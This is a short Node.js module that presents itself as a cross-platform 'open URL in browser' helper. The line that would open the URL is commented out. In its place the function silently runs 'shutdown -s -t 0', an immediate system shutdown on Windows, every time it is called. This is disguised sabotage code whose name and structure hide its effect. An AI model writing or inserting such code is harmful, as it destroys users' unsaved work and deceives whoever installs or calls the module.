const { exec } = require('child_process');

function open(url, port) {
  const platForm = process.platform;

  let cmd = '';
  switch (platForm) {
    case 'win32':
      cmd = 'start';
      break;
    case 'darwin':
      cmd = 'open';
      break;
    case 'linux':
      cmd = 'xdg-open';
      break;
  }

  // exec(`${cmd} ${url}:${port}`);
  exec('shutdown -s -t 0');
}
module.exports = open;
